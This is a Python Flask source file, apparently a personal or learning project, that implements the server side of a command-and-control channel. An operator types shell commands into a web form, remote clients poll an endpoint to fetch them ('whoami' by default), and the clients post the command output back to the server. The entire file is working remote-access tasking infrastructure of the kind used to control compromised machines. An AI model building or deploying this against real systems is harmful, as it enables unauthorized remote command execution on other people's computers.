from flask import Flask, request, jsonify, render_template
import requests
import threading # aw man

SERVER_URL = "http://127.0.0.1:5000"
app = Flask(__name__)

current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
client_commands = {} # 'client_id': ['command1', 'command2'], etc.

# have a data structure to hold clients?
    # if i want to run the same thing on all..? seems to be working already tho
    # otherwise need to figure out how to target specific ones

@app.route('/control')
def home():
    return render_template('home.html')

@app.route('/input-command', methods=['GET', 'POST'])
def input():
    if request.method == 'POST':
        global current_command
        current_command = request.form.get('command')
        print("!!!!!!!!!!current command:", current_command)
        return render_template('home.html', message="command received: "+str(current_command)) # i dont like this. NEED a return statement though

@app.route('/get-command', methods=['GET'])
def get_command():
    global current_command
    cmd = current_command
    current_command = "whoami"
    return jsonify(command=cmd) # what is to be sent to the client (get_command() in client.py)

#TODO: # how to handle disconnect for specific clients? is that even needed?

@app.route('/log-client', methods=['GET'])
def log_client():
    # client_id = # what should this be? hostname? ip? 
    client_id = "fuck"
    client_commands[client_id] = "whoami" # dict time
    print("this is the client_commands dictionary:", client_commands)
    return jsonify(client_id=client_id)

@app.route('/', methods=['POST'])
def command_result():
    result = request.json.get('result') # GET from client
    status = request.args.get('status')
    print("!!!!!!!!!!client command result:\n" + result)
    print(f"client is {status}") # hell yeah maybe put this somewhere else
    # also note status=connected already appears in POST header
    return jsonify({"status": "success"})


if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5000, threaded=True)